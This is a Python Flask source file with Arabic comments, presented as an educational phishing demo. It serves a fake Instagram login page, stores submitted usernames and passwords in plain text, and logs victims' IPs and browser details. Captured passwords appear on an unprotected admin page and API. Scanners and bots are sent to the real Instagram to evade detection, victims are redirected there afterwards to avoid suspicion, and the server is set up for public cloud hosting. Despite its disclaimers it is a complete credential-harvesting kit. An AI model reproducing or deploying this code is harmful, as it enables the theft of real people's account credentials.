#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
========================================
خادم Python Flask تعليمي لمحاكاة التصيد الاحتيالي
الغرض: توضيح كيفية عمل خوادم التصيد للأغراض التعليمية
========================================

هذا الخادم يحتوي على:
1. خدمة الصفحات الثابتة (HTML, CSS, JS)
2. معالجة بيانات تسجيل الدخول المزيفة
3. نظام تتبع وإحصائيات
4. واجهة إدارة لعرض البيانات المحفوظة
5. أنظمة حماية وكشف البوتات

تحذير: هذا الكود للتعليم فقط!
========================================
"""

# ========================================
# 1. استيراد المكتبات المطلوبة
# ========================================

from flask import Flask, render_template_string, request, redirect, url_for, jsonify, send_from_directory
import os
import json
import datetime
import hashlib
import socket
from urllib.parse import urlparse
import re
import threading
import time

# ========================================
# 2. إعداد التطبيق الأساسي
# ========================================

# إنشاء تطبيق Flask
app = Flask(__name__)

# إعدادات التطبيق
app.config['SECRET_KEY'] = 'education_phishing_demo_2024'  # مفتاح سري للتشفير
app.config['DEBUG'] = True  # وضع التطوير (فقط للتعليم)

# ========================================
# 3. إعداد المسارات والملفات
# ========================================

# مسار المجلد الحالي
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ملفات حفظ البيانات
STOLEN_DATA_FILE = os.path.join(BASE_DIR, 'stolen_credentials.json')
ACCESS_LOG_FILE = os.path.join(BASE_DIR, 'access_log.json')
STATS_FILE = os.path.join(BASE_DIR, 'statistics.json')

# ========================================
# 4. وظائف مساعدة لإدارة الملفات
# ========================================

def ensure_file_exists(file_path, default_content="[]"):
    """
    التأكد من وجود الملف وإنشاؤه إذا لم يكن موجوداً
    """
    if not os.path.exists(file_path):
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(default_content)

def read_json_file(file_path):
    """
    قراءة ملف JSON مع معالجة الأخطاء
    """
    ensure_file_exists(file_path)
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return []

def write_json_file(file_path, data):
    """
    كتابة ملف JSON مع معالجة الأخطاء
    """
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"خطأ في كتابة الملف {file_path}: {e}")
        return False

# ========================================
# 5. وظائف جمع معلومات المستخدم
# ========================================

def get_client_info(request):
    """
    جمع معلومات شاملة عن العميل/الضحية
    """
    # الحصول على عنوان IP الحقيقي (حتى خلف Proxy)
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        ip_address = request.environ['REMOTE_ADDR']
    else:
        ip_address = request.environ['HTTP_X_FORWARDED_FOR']
    
    # جمع جميع المعلومات المتاحة
    client_info = {
        'ip_address': ip_address,
        'user_agent': request.headers.get('User-Agent', 'غير معروف'),
        'accept_language': request.headers.get('Accept-Language', 'غير معروف'),
        'accept_encoding': request.headers.get('Accept-Encoding', 'غير معروف'),
        'referer': request.headers.get('Referer', 'غير معروف'),
        'host': request.headers.get('Host', 'غير معروف'),
        'connection': request.headers.get('Connection', 'غير معروف'),
        'upgrade_insecure_requests': request.headers.get('Upgrade-Insecure-Requests', 'غير معروف'),
        'timestamp': datetime.datetime.now().isoformat(),
        'method': request.method,
        'path': request.path,
        'args': dict(request.args),
        'form_data': dict(request.form) if request.method == 'POST' else {}
    }
    
    return client_info

def detect_bot(client_info):
    """
    كشف البوتات والأنشطة المشبوهة
    """
    bot_indicators = [
        'bot', 'crawler', 'spider', 'scraper', 'crawl', 'fetch',
        'python', 'java', 'curl', 'wget', 'http', 'request'
    ]
    
    user_agent = client_info.get('user_agent', '').lower()
    
    # فحص User Agent للكلمات المشبوهة
    for indicator in bot_indicators:
        if indicator in user_agent:
            return True, f"User Agent مشبوه: {indicator}"
    
    # فحص غياب Referer (مشبوه للوصول المباشر)
    if client_info.get('referer') == 'غير معروف':
        return True, "لا يوجد Referer"
    
    # فحص اللغات المقبولة (البوت عادة لا يرسل هذا)
    if client_info.get('accept_language') == 'غير معروف':
        return True, "لا توجد لغات مقبولة"
    
    return False, "مستخدم طبيعي"

# ========================================
# 6. إدارة الإحصائيات
# ========================================

def update_statistics(action_type, details=None):
    """
    تحديث إحصائيات الاستخدام
    """
    stats = read_json_file(STATS_FILE)
    
    if not isinstance(stats, dict):
        stats = {
            'total_visits': 0,
            'successful_captures': 0,
            'bot_attempts': 0,
            'daily_stats': {},
            'user_agents': {},
            'countries': {}
        }
    
    # تحديث الإحصائيات حسب نوع العملية
    today = datetime.date.today().isoformat()
    
    if action_type == 'visit':
        stats['total_visits'] = stats.get('total_visits', 0) + 1
        
    elif action_type == 'capture':
        stats['successful_captures'] = stats.get('successful_captures', 0) + 1
        
    elif action_type == 'bot':
        stats['bot_attempts'] = stats.get('bot_attempts', 0) + 1
    
    # إحصائيات يومية
    if 'daily_stats' not in stats:
        stats['daily_stats'] = {}
    
    if today not in stats['daily_stats']:
        stats['daily_stats'][today] = {
            'visits': 0,
            'captures': 0,
            'bots': 0
        }
    
    if action_type in stats['daily_stats'][today]:
        stats['daily_stats'][today][action_type] = stats['daily_stats'][today].get(action_type, 0) + 1
    
    # حفظ الإحصائيات
    write_json_file(STATS_FILE, stats)

# ========================================
# 7. المسارات الأساسية للتطبيق
# ========================================

@app.route('/')
def index():
    """
    الصفحة الرئيسية - عرض صفحة Instagram المزيفة
    """
    # جمع معلومات المستخدم
    client_info = get_client_info(request)
    
    # كشف البوت
    is_bot, bot_reason = detect_bot(client_info)
    
    # تسجيل الزيارة
    log_entry = {
        'type': 'visit',
        'client_info': client_info,
        'is_bot': is_bot,
        'bot_reason': bot_reason if is_bot else None
    }
    
    # حفظ في سجل الوصول
    access_log = read_json_file(ACCESS_LOG_FILE)
    access_log.append(log_entry)
    write_json_file(ACCESS_LOG_FILE, access_log)
    
    # تحديث الإحصائيات
    update_statistics('bot' if is_bot else 'visit')
    
    # إذا كان بوت، إعادة توجيه للموقع الأصلي
    if is_bot:
        print(f"🤖 تم كشف بوت: {bot_reason}")
        return redirect('https://www.instagram.com/')
    
    # عرض الصفحة المزيفة للمستخدمين الحقيقيين
    try:
        with open(os.path.join(BASE_DIR, 'index.html'), 'r', encoding='utf-8') as f:
            html_content = f.read()
        return html_content
    except FileNotFoundError:
        return "خطأ: لم يتم العثور على ملف index.html", 404

@app.route('/style.css')
def serve_css():
    """
    خدمة ملف CSS
    """
    return send_from_directory(BASE_DIR, 'style.css', mimetype='text/css')

@app.route('/script.js')
def serve_js():
    """
    خدمة ملف JavaScript
    """
    return send_from_directory(BASE_DIR, 'script.js', mimetype='application/javascript')

# ========================================
# 8. معالجة بيانات تسجيل الدخول (القلب النابض)
# ========================================

@app.route('/login', methods=['POST'])
@app.route('/login.php', methods=['POST'])  # للتوافق مع HTML
def handle_login():
    """
    معالجة بيانات تسجيل الدخول المزيفة
    هذا هو المكان الذي يتم فيه التقاط البيانات!
    """
    # جمع معلومات العميل
    client_info = get_client_info(request)
    
    # الحصول على بيانات النموذج
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    
    # التحقق من وجود البيانات
    if not username or not password:
        # بيانات ناقصة - إعادة توجيه مع خطأ
        return redirect('/?error=empty_fields')
    
    # كشف البوت
    is_bot, bot_reason = detect_bot(client_info)
    
    if is_bot:
        print(f"🤖 محاولة تسجيل دخول من بوت: {bot_reason}")
        update_statistics('bot')
        return redirect('https://www.instagram.com/')
    
    # ===== هنا يتم التقاط البيانات! =====
    
    # إنشاء سجل البيانات المسروقة
    stolen_record = {
        'id': hashlib.md5(f"{username}{password}{client_info['timestamp']}".encode()).hexdigest()[:8],
        'timestamp': client_info['timestamp'],
        'username': username,
        'password': password,  # في التطبيق الحقيقي، هذا مخيف!
        'client_info': client_info,
        'success': True
    }
    
    # حفظ البيانات المسروقة
    stolen_data = read_json_file(STOLEN_DATA_FILE)
    stolen_data.append(stolen_record)
    write_json_file(STOLEN_DATA_FILE, stolen_data)
    
    # تسجيل العملية
    log_entry = {
        'type': 'credentials_captured',
        'record_id': stolen_record['id'],
        'username': username,
        'client_info': client_info
    }
    
    access_log = read_json_file(ACCESS_LOG_FILE)
    access_log.append(log_entry)
    write_json_file(ACCESS_LOG_FILE, access_log)
    
    # تحديث الإحصائيات
    update_statistics('capture')
    
    # طباعة تأكيد في وحدة التحكم (للمطور)
    print(f"🎯 تم التقاط بيانات جديدة!")
    print(f"   المستخدم: {username}")
    print(f"   الوقت: {client_info['timestamp']}")
    print(f"   IP: {client_info['ip_address']}")
    print(f"   ID: {stolen_record['id']}")
    
    # إعادة توجيه للموقع الأصلي (لتجنب الشك)
    return redirect('https://www.instagram.com/')

# ========================================
# 9. واجهة الإدارة (لمشاهدة البيانات المحفوظة)
# ========================================

@app.route('/admin')
def admin_panel():
    """
    لوحة تحكم لعرض البيانات المحفوظة
    """
    # قراءة البيانات
    stolen_data = read_json_file(STOLEN_DATA_FILE)
    access_log = read_json_file(ACCESS_LOG_FILE)
    stats = read_json_file(STATS_FILE)
    
    # إنشاء صفحة HTML للإدارة
    admin_html = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>لوحة التحكم التعليمية</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                margin: 20px;
                background: #f5f5f5;
                direction: rtl;
            }}
            .container {{
                max-width: 1200px;
                margin: 0 auto;
                background: white;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }}
            .header {{
                text-align: center;
                background: #e74c3c;
                color: white;
                padding: 15px;
                border-radius: 5px;
                margin-bottom: 20px;
            }}
            .stats {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
                margin-bottom: 30px;
            }}
            .stat-card {{
                background: #3498db;
                color: white;
                padding: 20px;
                border-radius: 5px;
                text-align: center;
            }}
            .data-table {{
                width: 100%;
                border-collapse: collapse;
                margin-bottom: 20px;
            }}
            .data-table th, .data-table td {{
                border: 1px solid #ddd;
                padding: 8px;
                text-align: right;
            }}
            .data-table th {{
                background: #f2f2f2;
            }}
            .warning {{
                background: #f39c12;
                color: white;
                padding: 10px;
                border-radius: 5px;
                margin-bottom: 20px;
                text-align: center;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔒 لوحة التحكم التعليمية - مشروع التصيد الاحتيالي</h1>
                <p>⚠️ هذه البيانات للأغراض التعليمية فقط!</p>
            </div>
            
            <div class="warning">
                <strong>تحذير:</strong> هذا المشروع تعليمي. لا تستخدم هذه المعلومات لأغراض ضارة!
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>إجمالي الزيارات</h3>
                    <h2>{stats.get('total_visits', 0)}</h2>
                </div>
                <div class="stat-card">
                    <h3>البيانات المحفوظة</h3>
                    <h2>{len(stolen_data)}</h2>
                </div>
                <div class="stat-card">
                    <h3>محاولات البوت</h3>
                    <h2>{stats.get('bot_attempts', 0)}</h2>
                </div>
            </div>
            
            <h2>🎯 البيانات المحفوظة</h2>
            <table class="data-table">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>الوقت</th>
                        <th>اسم المستخدم</th>
                        <th>كلمة المرور</th>
                        <th>عنوان IP</th>
                        <th>المتصفح</th>
                    </tr>
                </thead>
                <tbody>
    """
    
    # إضافة البيانات المحفوظة للجدول
    for record in reversed(stolen_data[-10:]):  # آخر 10 سجلات فقط
        admin_html += f"""
                    <tr>
                        <td>{record.get('id', 'غير معروف')}</td>
                        <td>{record.get('timestamp', 'غير معروف')}</td>
                        <td><strong>{record.get('username', 'غير معروف')}</strong></td>
                        <td><code>{record.get('password', 'غير معروف')}</code></td>
                        <td>{record.get('client_info', {}).get('ip_address', 'غير معروف')}</td>
                        <td>{record.get('client_info', {}).get('user_agent', 'غير معروف')[:50]}...</td>
                    </tr>
        """
    
    admin_html += """
                </tbody>
            </table>
            
            <h2>📊 سجل الوصول (آخر 10 عمليات)</h2>
            <table class="data-table">
                <thead>
                    <tr>
                        <th>النوع</th>
                        <th>الوقت</th>
                        <th>عنوان IP</th>
                        <th>الحالة</th>
                    </tr>
                </thead>
                <tbody>
    """
    
    # إضافة سجل الوصول
    for log in reversed(access_log[-10:]):  # آخر 10 عمليات
        log_type = log.get('type', 'غير معروف')
        if log_type == 'visit':
            log_type = '👁️ زيارة'
        elif log_type == 'credentials_captured':
            log_type = '🎯 التقاط بيانات'
        
        status = '🤖 بوت' if log.get('client_info', {}).get('is_bot', False) else '👤 مستخدم'
        
        admin_html += f"""
                    <tr>
                        <td>{log_type}</td>
                        <td>{log.get('client_info', {}).get('timestamp', 'غير معروف')}</td>
                        <td>{log.get('client_info', {}).get('ip_address', 'غير معروف')}</td>
                        <td>{status}</td>
                    </tr>
        """
    
    admin_html += """
                </tbody>
            </table>
            
            <div style="text-align: center; margin-top: 30px; padding: 20px; background: #ecf0f1; border-radius: 5px;">
                <p><strong>ملاحظة:</strong> هذه البيانات محفوظة محلياً في ملفات JSON.</p>
                <p>في التطبيق الحقيقي، يتم إرسالها فوراً للمهاجم عبر وسائل مختلفة.</p>
                <a href="/" style="background: #3498db; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">العودة للصفحة الرئيسية</a>
            </div>
        </div>
    </body>
    </html>
    """
    
    return admin_html

# ========================================
# 10. API للحصول على البيانات (JSON)
# ========================================

@app.route('/api/data')
def api_get_data():
    """
    API لجلب البيانات بصيغة JSON
    """
    data = {
        'stolen_credentials': read_json_file(STOLEN_DATA_FILE),
        'access_log': read_json_file(ACCESS_LOG_FILE),
        'statistics': read_json_file(STATS_FILE)
    }
    return jsonify(data)

@app.route('/api/stats')
def api_get_stats():
    """
    API للحصول على الإحصائيات فقط
    """
    return jsonify(read_json_file(STATS_FILE))

# ========================================
# 11. وظائف المساعدة للخادم
# ========================================

def get_local_ip():
    """
    الحصول على عنوان IP المحلي
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def print_startup_info():
    """
    طباعة معلومات بدء التشغيل
    """
    local_ip = get_local_ip()
    print("\n" + "="*60)
    print("🔒 خادم التصيد التعليمي جاهز!")
    print("="*60)
    print(f"📍 عنوان الخادم المحلي: http://127.0.0.1:5000")
    print(f"🌐 عنوان الشبكة المحلية: http://{local_ip}:5000")
    print(f"⚙️ لوحة التحكم: http://127.0.0.1:5000/admin")
    print("="*60)
    print("📋 تعليمات الاستخدام:")
    print("1. شارك الرابط مع طلاب آخرين للتجربة")
    print("2. اطلب منهم إدخال بيانات وهمية")
    print("3. راقب البيانات في لوحة التحكم")
    print("4. اضغط Ctrl+C لإيقاف الخادم")
    print("="*60)
    print("⚠️ تحذير: للأغراض التعليمية فقط!")
    print("="*60)

# ========================================
# 12. تشغيل الخادم
# ========================================

if __name__ == '__main__':
    # إنشاء الملفات المطلوبة
    ensure_file_exists(STOLEN_DATA_FILE, "[]")
    ensure_file_exists(ACCESS_LOG_FILE, "[]")
    ensure_file_exists(STATS_FILE, "{}")
    
    # طباعة معلومات بدء التشغيل
    print_startup_info()
    
    try:
        # الحصول على رقم المنفذ من متغير البيئة (لمواقع النشر مثل Render)
        import os
        port = int(os.environ.get('PORT', 5000))
        
        # تشغيل الخادم
        app.run(
            host='0.0.0.0',  # السماح للوصول من أي عنوان IP
            port=port,       # رقم المنفذ من متغير البيئة
            debug=False,     # إيقاف وضع التطوير للنشر
            threaded=True    # دعم طلبات متعددة
        )
    except KeyboardInterrupt:
        print("\n🛑 تم إيقاف الخادم بواسطة المستخدم")
    except Exception as e:
        print(f"\n❌ خطأ في تشغيل الخادم: {e}")

"""
========================================
ملخص ما يحتويه هذا الخادم:

1. خدمة الصفحات الثابتة (HTML, CSS, JS)
2. معالجة بيانات تسجيل الدخول وحفظها
3. كشف البوتات والأنشطة المشبوهة
4. تتبع شامل للزيارات والإحصائيات
5. لوحة تحكم لمراقبة البيانات المحفوظة
6. API للوصول للبيانات برمجياً
7. نظام سجلات مفصل

كيفية عمل النظام بين الطلاب:
1. الطالب الأول يشغل الخادم على جهازه
2. يحصل على رابط الخادم (مثل http://192.168.1.100:5000)
3. يرسل الرابط للطالب الثاني
4. الطالب الثاني يفتح الرابط ويدخل بيانات وهمية
5. البيانات تُحفظ على جهاز الطالب الأول
6. الطالب الأول يراقب البيانات عبر /admin

أهمية هذا الخادم:
- يوضح كيفية عمل خوادم التصيد الحقيقية
- يظهر مدى خطورة البيانات المجمعة
- يعلم الطلاب كيفية الحماية من هذه الهجمات
========================================
"""
